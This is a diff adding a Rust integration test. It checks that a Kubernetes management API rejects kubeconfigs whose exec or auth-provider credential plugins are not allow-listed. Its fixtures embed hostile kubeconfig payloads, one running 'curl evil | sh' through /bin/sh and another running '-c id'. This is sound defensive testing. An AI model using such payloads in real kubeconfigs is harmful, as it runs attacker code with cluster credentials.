@@ -2640,3 +2640,68 @@ async fn fleet_and_overview_are_filtered_to_the_callers_grants() {
     assert_eq!(st, StatusCode::OK);
     assert_eq!(rows, serde_json::json!([]));
 }
+
+/// S11-303: a kubeconfig whose exec credential plugin is not allow-listed is
+/// refused on import, on registering a path, and on re-pointing a cluster —
+/// with a 400 that names the plugin; an allow-listed plugin registers.
+#[tokio::test]
+async fn kubeconfig_exec_plugins_are_allow_listed() {
+    let (ctx, user) = TestCtx::new().await;
+    let evil = "apiVersion: v1\nkind: Config\ncurrent-context: kind-kind\n\
+contexts:\n- name: kind-kind\n  context: {cluster: k, user: u}\n\
+users:\n- name: u\n  user:\n    exec:\n      apiVersion: client.authentication.k8s.io/v1beta1\n      \
+command: /bin/sh\n      args: [-c, 'curl evil | sh']\n";
+    let (st, _, t) = call(
+        &ctx,
+        &user,
+        "POST",
+        "/k8s/clusters/import",
+        Some(serde_json::json!({"name": "pasted", "kubeconfig_yaml": evil})),
+    )
+    .await;
+    assert_eq!(st, StatusCode::BAD_REQUEST, "{t}");
+    assert!(t.contains("/bin/sh"), "{t}");
+    let legacy = "apiVersion: v1\nkind: Config\n\
+users:\n- name: u\n  user:\n    auth-provider:\n      name: gcp\n      config: {cmd-path: /bin/sh, cmd-args: '-c id'}\n";
+    let (st, _, t) = call(
+        &ctx,
+        &user,
+        "POST",
+        "/k8s/clusters/import",
+        Some(serde_json::json!({"name": "legacy", "kubeconfig_yaml": legacy})),
+    )
+    .await;
+    assert_eq!(st, StatusCode::BAD_REQUEST, "{t}");
+    assert!(t.contains("auth-provider 'gcp'"), "{t}");
+
+    // Registering a path: the chosen context's user is checked.
+    let bad = ctx.data_dir.path().join("evil-kube.yaml");
+    std::fs::write(&bad, evil).unwrap();
+    let (st, _, t) = call(
+        &ctx,
+        &user,
+        "POST",
+        "/k8s/clusters",
+        Some(serde_json::json!({"name": "evil", "source": "kubeconfig",
+            "kubeconfig_path": bad.to_string_lossy(), "context_name": "kind-kind"})),
+    )
+    .await;
+    assert_eq!(st, StatusCode::BAD_REQUEST, "{t}");
+    assert!(t.contains("/bin/sh"), "{t}");
+
+    // An allow-listed plugin registers; re-pointing it at the evil file fails.
+    let good = ctx.data_dir.path().join("good-kube.yaml");
+    std::fs::write(&good, evil.replace("command: /bin/sh", "command: aws")).unwrap();
+    let c = create_cluster_at(&ctx, &user, good.to_string_lossy().to_string()).await;
+    let id = c["id"].as_str().unwrap();
+    let (st, _, t) = call(
+        &ctx,
+        &user,
+        "PATCH",
+        &format!("/k8s/clusters/{id}"),
+        Some(serde_json::json!({"kubeconfig_path": bad.to_string_lossy()})),
+    )
+    .await;
+    assert_eq!(st, StatusCode::BAD_REQUEST, "{t}");
+    assert!(t.contains("/bin/sh"), "{t}");
+}
